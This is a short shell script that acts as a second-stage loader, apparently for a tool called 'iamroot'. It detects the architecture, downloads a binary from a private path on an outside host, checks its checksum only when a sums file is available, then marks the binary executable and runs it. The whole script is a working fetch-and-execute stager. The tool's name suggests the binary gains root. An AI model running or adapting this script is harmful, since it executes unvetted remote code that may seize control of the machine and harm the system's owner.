

set -eu

BASE="${IAMROOT_STAGE2_BASE:-https://iamroot.victorsec.com}"
PRIV="$BASE/private"

case "$(uname -m)" in
    x86_64|amd64)  ARCH=amd64 ;;
    aarch64|arm64) ARCH=arm64 ;;
    *) echo "[-] stage2: unsupported architecture: $(uname -m)" >&2; exit 1 ;;
esac

BIN="iamroot-full-linux-$ARCH"
TMP="$(mktemp "${TMPDIR:-/tmp}/iamroot2.XXXXXX")"
trap 'rm -f "$TMP" "$TMP.sum" 2>/dev/null' EXIT

fetch() {
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -sS --retry 2 --connect-timeout 15 -o "$2" "$1"
    else
        wget -q --timeout=20 -O "$2" "$1"
    fi
}

echo "[*] stage2: downloading $PRIV/$BIN"
fetch "$PRIV/$BIN" "$TMP"

if fetch "$PRIV/SHA256SUMS" "$TMP.sum" 2>/dev/null; then
    want="$(awk -v b="$BIN" '$2 == b {print $1}' "$TMP.sum")"
    if [ -n "$want" ]; then
        if command -v sha256sum >/dev/null 2>&1; then
            got="$(sha256sum "$TMP" | awk '{print $1}')"
        else
            got="$(shasum -a 256 "$TMP" | awk '{print $1}')"
        fi
        [ "$got" = "$want" ] || { echo "[-] stage2: checksum mismatch" >&2; exit 1; }
        echo "[+] stage2: checksum verified"
    fi
fi

chmod 755 "$TMP"
echo "[+] stage2: running full binary (${IAMROOT_ARGS:-no flags})"

exec "$TMP" ${IAMROOT_ARGS:-}
